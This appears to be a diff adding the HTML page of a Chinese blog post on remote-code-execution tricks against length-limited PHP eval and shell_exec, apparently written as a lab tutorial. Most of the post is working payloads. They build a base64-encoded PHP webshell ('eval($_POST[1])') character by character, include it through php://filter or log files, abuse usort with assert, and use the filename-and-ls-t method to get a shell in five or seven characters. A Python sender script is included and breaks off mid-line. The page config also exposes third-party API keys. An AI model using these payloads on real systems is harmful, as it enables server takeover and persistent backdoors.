@@ -1,0 +1,192 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="rce的一些奇技淫巧"><meta name="keywords" content="RCE"><meta name="author" content="JGwebre,undefined"><meta name="copyright" content="JGwebre"><title>rce的一些奇技淫巧【JG的个人博客】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- script(src=url_for("/js/mathjax/mathjax.js"))--><script type="text/x-mathjax-config">MathJax.Hub.Config({
+    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
+});
+</script><script>var isPassword = '' || false;
+if (isPassword) {
+    if (prompt('请输入文章密码') !== '') {
+        alert('密码错误！');
+        history.back();
+    }
+}</script><script>window.GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"M89DTZNQI5","apiKey":"3349454e63ed12455aa77088742476f1","indexName":"heisha","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: {"path":"search.json","languages":{"hits_empty":"local_search.hits_empty"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  gitment: {},
+  valine: {"appId":"vBmF8qvDShMMqm39diUFWroM-gzGzoHsz","appKey":"vcClV59WM7pPzz3R46pITQlv","placeholder":"welcome to say something..."},
+  twikoo: {},
+}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="JG的个人博客" type="application/atom+xml">
+</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP-Eval%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E9%99%90%E5%88%B6%E5%9C%A816%E4%B8%AA%E5%AD%97%E7%AC%A6%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%A6%82%E4%BD%95%E6%8B%BF%E5%88%B0Webshell%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">PHP Eval函数参数限制在16个字符的情况下，如何拿到Webshell？</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">远程文件包含的利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">本地文件包含的利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.</span> <span class="toc-text">本地日志包含</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%A0%87%E5%87%86%E7%AD%94%E6%A1%88%EF%BC%9A%E5%88%A9%E7%94%A8%E5%8F%98%E9%95%BF%E5%8F%82%E6%95%B0%E7%89%B9%E6%80%A7%E5%B1%95%E5%BC%80%E6%95%B0%E7%BB%84"><span class="toc-number">1.4.</span> <span class="toc-text">标准答案：利用变长参数特性展开数组</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%9C%A87%E4%B8%AA%E5%AD%97%E7%AC%A6%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%A6%82%E4%BD%95%E6%8B%BF%E5%88%B0shell"><span class="toc-number">2.</span> <span class="toc-text">Linux命令长度限制在7个字符的情况下，如何拿到shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%94%E5%AD%97%E7%AC%A6"><span class="toc-number">3.</span> <span class="toc-text">五字符</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">JGwebre</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/heisha123" target="_blank">GitHub<i class="icon-dot bg-color7"></i></a><a class="links-button button-hover" href="mailto:gzyjslb@163.com" target="_blank">E-Mail<i class="icon-dot bg-color10"></i></a><a class="links-button button-hover" href="tencent://message/?uin=1852384503&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color1"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">17</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">11</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">1</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">JG的个人博客</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">rce的一些奇技淫巧</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2025-07-23 | 更新于 2025-07-25</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/RCE/">RCE</a></div></div></div><div class="main-content"><p>EVAL长度限制突破技巧</p>
+<span id="more"></span>
+
+
+
+<h5 id="PHP-Eval函数参数限制在16个字符的情况下，如何拿到Webshell？"><a href="#PHP-Eval函数参数限制在16个字符的情况下，如何拿到Webshell？" class="headerlink" title="PHP Eval函数参数限制在16个字符的情况下，如何拿到Webshell？"></a>PHP Eval函数参数限制在16个字符的情况下，如何拿到Webshell？</h5><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$param = $_REQUEST[&#x27;param&#x27;];</span><br><span class="line">if (</span><br><span class="line">strlen($param) &lt; 17 &amp;&amp; stripos($param, &#x27;eval&#x27;) === false &amp;&amp; stripos($param, &#x27;assert&#x27;) === false</span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line">eval($param);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723172109903.png" alt="image-20250723172109903"></p>
+<p>这里其实很容易想到利用<code>$_GET[1]</code> </p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param=echo%20`$_GET[1]`;&amp;1=whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723173601674.png" alt="image-20250723173601674"></p>
+<p>还有一种方法呢就是利用exec</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param=exec($_GET[1]);</span><br></pre></td></tr></table></figure>
+
+<p>其实核心都是<code>$_GET[1]</code></p>
+<p>这里还有另一种解法，利用文件包含</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723174057360.png" alt="image-20250723174057360"></p>
+<h6 id="远程文件包含的利用"><a href="#远程文件包含的利用" class="headerlink" title="远程文件包含的利用"></a>远程文件包含的利用</h6><p><code>include$_GET[1];</code>也是可以运行的，中间的空格可以不要。</p>
+<p>这也是一个思路，但限制就是需要开启远程文件包含，但这个选项默认是关闭的。</p>
+<h6 id="本地文件包含的利用"><a href="#本地文件包含的利用" class="headerlink" title="本地文件包含的利用"></a>本地文件包含的利用</h6><p>那么，文件包含真的不行么？</p>
+<p>有一种思路，利用file_put_contents可以将字符一个个地写入一个文件中，大概请求如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param=$_GET[a](N,a,8);&amp;a=file_put_contents</span><br></pre></td></tr></table></figure>
+
+<p>file_put_contents的第一个参数是文件名，我传入N。PHP会认为N是一个常量，但我之前并没有定义这个常量，于是PHP就会把它转换成字符串’N’；第二个参数是要写入的数据，a也被转换成字符串’a’；第三个参数是flag，当flag&#x3D;8的时候内容会追加在文件末尾，而不是覆盖。【因为默认是0 ，0是覆盖，8是追加】</p>
+<p>开始测试</p>
+<p>结果发现</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723175922187.png" alt="image-20250723175922187"></p>
+<p>权限不足，忘记改html为www:data,权限了</p>
+<p>执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown www-data:www-data /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723180024341.png" alt="image-20250723180024341"></p>
+<p>除了file_put_contents，error_log函数效果也类似。</p>
+<p>但这个方法有个问题，就是file_put_contents第二个参数如果是符号，就会导致PHP出错，比如<code>param=$_GET[a](N,&lt;,8);&amp;a=file_put_contents</code>。但如果要写webshell的话，“&lt;”等符号又是必不可少的。</p>
+<p>那么我们每次向文件’N’中写入一个字母或数字，最后构成一个base64字符串，再包含的时候使用php:&#x2F;&#x2F;filter对base64进行解码即可。</p>
+<p>最后请求如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbMV0pOw   //&lt;?php eval($_POST[1]);</span><br><span class="line"># 最后包含</span><br><span class="line">param=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N</span><br></pre></td></tr></table></figure>
+
+<p>我们用蚁剑 连接试试</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723180625969.png" alt="image-20250723180625969"></p>
+<p>成功getshell。</p>
+<p>然后这里看了P神的文章发现还可以利用以下几个方式</p>
+<h6 id="本地日志包含"><a href="#本地日志包含" class="headerlink" title="本地日志包含"></a>本地日志包含</h6><p>首先通过各种方法找到web日志，然后利用上面说的include的方式来包含之。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param=include$_GET[a];&amp;a=/home/u244201241/.logs/php_error.log</span><br></pre></td></tr></table></figure>
+
+<p>如果找不到web日志，利用条件竞争的方法，包含tmp文件也可以。</p>
+<h6 id="标准答案：利用变长参数特性展开数组"><a href="#标准答案：利用变长参数特性展开数组" class="headerlink" title="标准答案：利用变长参数特性展开数组"></a>标准答案：利用变长参数特性展开数组</h6><p>变长参数是PHP5.6新引入的特性，文档在此： <a target="_blank" rel="noopener" href="http://php.net/manual/zh/migration56.new-features.php">http://php.net/manual/zh/migration56.new-features.php</a></p>
+<p>和Python中的<code>**kwargs</code>，类似，在PHP中可以使用 <code>func(...$arr)</code>这样的方式，将<code>$arr</code>数组展开成多个参数，传入func函数。</p>
+<p>再结合回调后门，即可构造一个完美的利用，数据包如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">param=usort(...$_GET);</span><br></pre></td></tr></table></figure>
+
+<p>效果图：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/content/uploadfile/201701/77d21484750770.jpg"><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/thum-77d21484750770.jpg" alt="14847507412871.jpg"></a></p>
+<p>大概过程就是，GET变量被展开成两个参数<code>[&#39;test&#39;, &#39;phpinfo();&#39;]</code>和<code>assert</code>，传入usort函数。usort函数的第二个参数是一个回调函数<code>assert</code>，其调用了第一个参数中的<code>phpinfo();</code>。修改<code>phpinfo();</code>为webshell即可。</p>
+<p>也就是我上一篇文章细致的研究过</p>
+<h5 id="Linux命令长度限制在7个字符的情况下，如何拿到shell"><a href="#Linux命令长度限制在7个字符的情况下，如何拿到shell" class="headerlink" title="Linux命令长度限制在7个字符的情况下，如何拿到shell"></a>Linux命令<strong>长</strong>度限制在7个字符的情况下，如何拿到shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在二进制漏洞利用中，某师傅遇到可控数据只有8字节的情况，去掉字符串尾的\0，限制在7个字符。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$param = $_REQUEST[&#x27;param&#x27;]; </span><br><span class="line">if ( strlen($param) &lt; 8 )</span><br><span class="line">&#123; </span><br><span class="line">     echo shell_exec($param);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里看了来自 @超威蓝猫 px1624 师傅的奇技淫巧。</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723181230904.png" alt="image-20250723181230904"></p>
+<p>在Linux下 W&gt;hp,可以直接写入文件名为hp的文件</p>
+<p>其实这里也可以不用w，直接 &gt;hp,也可以，</p>
+<p>而且在Linux下 <code>ls -t</code> 这个可以安装时间顺序进行排序，也就是我们先创建的文件会排最下面，越晚创建的文件会排在最上面</p>
+<p>这里为什么要引入<code>\</code> 呢？ 就是为了转义ls 的换行符，因为我们只能7个字符慢慢写，还没写完，所以引入转义字符，就可以接着写啦，</p>
+<p>这里我们也不能直接写入<code>&lt;</code> 测试发现会报错</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723182007487.png" alt="image-20250723182007487"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOw |base64 -d&gt;c.php</span><br><span class="line">//&lt;?php eval($_POST[1]);</span><br></pre></td></tr></table></figure>
+
+<p>我们来尝试写入这个命令</p>
+<p>因为先写的在最后面，所以我们要倒着写</p>
+<p>这里还是要注意权限的问题</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723182500233.png" alt="image-20250723182500233"></p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723182940024.png" alt="image-20250723182940024"></p>
+<p>写入完毕</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -t&gt;0</span><br></pre></td></tr></table></figure>
+
+<p>将他排序后的结果重定向给0</p>
+<p>然后执行</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723184238033.png" alt="image-20250723184238033"></p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723184256399.png" alt="image-20250723184256399"></p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723184302522.png" alt="image-20250723184302522"></p>
+<p>连接也没有任何的问题</p>
+<h5 id="五字符"><a href="#五字符" class="headerlink" title="五字符"></a>五字符</h5><p>5字符我们如何拿到webshell呢？</p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(strlen($_GET[&#x27;cmd&#x27;])&lt;=5 &amp;&amp; !preg_match(&#x27;/rm/&#x27;,$_GET[&#x27;cmd&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo shell_exec($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里其实我们也可以用刚刚7字符的思路</p>
+<p>通过 <code>&gt;</code> 写入文件名来执行命令</p>
+<p>这里引入了一个新的参数 <code>ls -h</code> </p>
+<p><code>-h参数以易读的方式显示文件或目录大小</code></p>
+<p>就比如我们构建的 <code>ls -t &gt; a</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;a\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723201455590.png" alt="image-20250723201455590"></p>
+<p>因为ls是默认按照字母顺序来排序的，所以添上-h是为了让命令以正常的顺序运行</p>
+<p>所以这里我们 将 <code>&gt;t-</code> 替换为 <code>&gt;ht-</code></p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723201648294.png" alt="image-20250723201648294"></p>
+<p>ls写入文件中时，每个文件名都是单独一行，它会自动换行，有时会影响到我们的命令执行，而dir会把内容全部写入一行中，同时会自动补全空格</p>
+<p>例如</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723201821161.png" alt="image-20250723201821161"></p>
+<p>这里还有一个知识点</p>
+<p><code>*</code> 的用法</p>
+<p>在Linux中<code>*</code> 大家都知道可以作为通配符使用，但是他也可以作为 命令来执行</p>
+<p>比如</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723202106910.png" alt="image-20250723202106910"></p>
+<p>这里 我们可以看到<code>* &gt; v</code> 成功 将dir的结果重定向到v中了，这是为什么呢？</p>
+<p>查询资料后发现</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723202340865.png" alt="image-20250723202340865"></p>
+<p>正好我们这里的第一个是dir</p>
+<p>我们还可以做一个测试</p>
+<p>追加一个 <code>&gt;a</code> 这样第一个就不是dir了，也就可以看到是否是执行dir</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723202446925.png" alt="image-20250723202446925"></p>
+<p>爆了a没找到，印证我们的看法</p>
+<p>然后我们继续</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">每个都是一个文件</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v        </span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a        </span><br><span class="line">sh a        最后用sh来执行命令</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723202611194.png" alt="image-20250723202611194"></p>
+<p>按道理来说，按照我们前面的想法，这里*应该匹配 dir，他为什么匹配到 rev了呢？</p>
+<p>我们可以设置一下，让shell，打印我们所执行的命令，看看他到底是匹配的什么</p>
+<p><code>set -x</code> 执行这条命令</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723203036906.png" alt="image-20250723203036906"></p>
+<p>确实是先匹配的rev 并执行的</p>
+<p>也就是说，形如*v 这样的 他会先将 符合 这个通配符的全部文件列出来，然后取第一个再进行命令执行</p>
+<p>接下来就可以开始拆分字符串了，第一种可以直接构造一句话木马,因为有<code>&lt;,?</code>，需要将其进行base64转换，这样payload里就没有特殊字符了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">写入一句话木马 直接写入 他转为base64编码</span><br><span class="line">&lt;?php eval($_POST[1]);   base64:PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br><span class="line">构造</span><br><span class="line">echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOw|base64 -d&gt;1.php</span><br><span class="line">sh f</span><br><span class="line">1.php 就是你的&lt;?php eval($_POST[1]);</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是必须要将其中一个空格用<code>$&#123;IFS&#125;</code>代替，否则会被’吃’掉一个空格</p>
+<p>这里有个小技巧，可以利用</p>
+<p><code>echo &#39;PD9waHAgZXZhbCgkX1BPU1RbMV0pOw|base64 -d&gt;1.php&#39; | fold -w2 | sed &#39;s/$/\\\\/&#39;</code></p>
+<p>直接拆分，只需要注意转义即可</p>
+<p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723204523305.png" alt="image-20250723204523305"></p>
+<p>尝试写入</p>
+<p>我写了一个脚本，来增加我们写入的效率</p>
+<p>因为ls -t按时间先后顺序排序，所以需要倒置，同时加上<code>ls -ht &gt; a</code>的构造</p>
+<p>这里要注意我们所传的值不能有重复的命名</p>
+<p>运行脚本</p>
+<p>完整的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"># 目标 URL</span><br><span class="line">url = &quot;http://192.168.197.134/rce/test.php?cmd=&quot;</span><br><span class="line">payload_lines = [</span><br><span class="line">    &quot;&gt;dir&quot;,</span><br><span class="line">    &quot;&gt;f\&gt;&quot;,</span><br><span class="line">    &quot;&gt;ht-&quot;,</span><br><span class="line">    &quot;&gt;sl&quot;,</span><br><span class="line">    &quot;*&gt;v&quot;,</span><br><span class="line">    &quot;&gt;rev &quot;,</span><br><span class="line">    &quot;*v&gt;a&quot;,</span><br><span class="line">    &quot;&gt;p &quot;,</span><br><span class="line">    &quot;&gt;ph\\&quot;,</span><br><span class="line">    &quot;&gt;1.\\&quot;,</span><br><span class="line">    &quot;&gt;\&gt;\\&quot;,</span><br><span class="line">    &quot;&gt;-d\\&quot;,</span><br><span class="line">    &quot;&gt;\ \\ &quot;,</span><br><span class="line">    &quot;&gt;64\\&quot;,</span><br><span class="line">    &quot;&gt;se\\&quot;,</span><br><span class="line">    &quot;&gt;ba\\&quot;,</span><br><span class="line">    &quot;&gt;\|\\ &quot;,</span><br><span class="line">    &quot;&gt;Ow\\&quot;,</span><br><span class="line">    &quot;&gt;0p\\&quot;,</span><br><span class="line">    &quot;&gt;MV\\&quot;,</span><br><span class="line">    &quot;&gt;Rb\\&quot;,</span><br><span class="line">    &quot;&gt;U1\\&quot;,</span><br><span class="line">    &quot;&gt;BP\\&quot;,</span><br><span class="line">    &quot;&gt;X1\\&quot;,</span><br><span class="line">    &quot;&gt;gk\\&quot;,</span><br><span class="line">    &quot;&gt;bC\\&quot;,</span><br><span class="line">    &quot;&gt;Zh\\&quot;,</span><br><span class="line">    &quot;&gt;ZX\\&quot;,</span><br><span class="line">    &quot;&gt;Ag\\&quot;,</span><br><span class="line">    &quot;&gt;aH\\&quot;,</span><br><span class="line">    &quot;&gt;9w\\&quot;,</span><br><span class="line">    &quot;&gt;PD\\&quot;,</span><br><span class="line">]</span><br><span class="line"># 逐个发送请求</span><br><span class="line">for line in payload_lines:</span><br><span class="line">    full_url = url + line</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(full_url, timeout=5)</span><br><span class="line">        print(f&quot;[+] Sent: &#123;line&#125; =&gt; Status: &#123;response.status_code&#125;&quot;)</span><br><span class="line">        # 可打印输出结果：print(response.text)</span><br><span class="line">    except Exception as 